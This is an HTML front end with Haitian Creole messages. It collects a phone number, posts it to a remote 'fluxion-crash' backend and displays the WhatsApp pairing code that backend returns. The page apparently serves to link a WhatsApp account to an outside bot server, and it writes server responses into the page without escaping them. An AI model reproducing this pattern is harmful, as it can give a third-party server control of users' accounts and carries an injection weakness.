<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FLUXION.ACCOUNT</title>
    <style>
        body { background: #070207; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #e50914; border-radius: 12px; background: #0f050f; }
        input, button { width: 100%; padding: 12px; margin: 10px 0; font-size: 16px; border-radius: 8px; border: none; box-sizing: border-box; }
        input { background: #1a081a; color: #fff; border: 1px solid #e50914; text-align: center; }
        button { background: #e50914; color: white; cursor: pointer; font-weight: bold; }
        #result-box { margin-top: 15px; display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>CONNECT WHATSAPP</h2>
        <form id="connect-form">
            <input type="text" id="phone" placeholder="+50944618286" required>
            <button type="submit" id="submit-btn">CONTINUE →</button>
        </form>

        <!-- Kote kòd la pral parèt anba a -->
        <div id="result-box">
            <p id="status-text" style="color: #aaa; font-size: 14px;"></p>
        </div>
    </div>

    <script>
        const BACKEND_URL = "https://fluxion-crash-v2-1.onrender.com/connect";

        document.getElementById('connect-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const btn = document.getElementById('submit-btn');
            const resultBox = document.getElementById('result-box');
            const statusText = document.getElementById('status-text');

            btn.innerText = "Chaje...";
            btn.disabled = true;
            resultBox.style.display = 'block';
            statusText.innerHTML = "Y ap mande kòd la sou WhatsApp...";

            try {
                const response = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });

                const data = await response.json();

                if (data.success) {
                    statusText.innerHTML = `
                        <span style="color: #fff; display: block; margin-bottom: 5px;">Kòd Jumelage ou:</span>
                        <b style="color: #00ff00; font-size: 24px; letter-spacing: 2px;">${data.code}</b>
                    `;
                } else {
                    statusText.innerHTML = `<span style="color: #e50914;">${data.error || "Echèk."}</span>`;
                }
                btn.innerText = "CONTINUE →";
                btn.disabled = false;
            } catch (err) {
                console.error(err);
                statusText.innerHTML = `<span style="color: #e50914;">Erè koneksyon ak sèvè a.</span>`;
                btn.innerText = "CONTINUE →";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
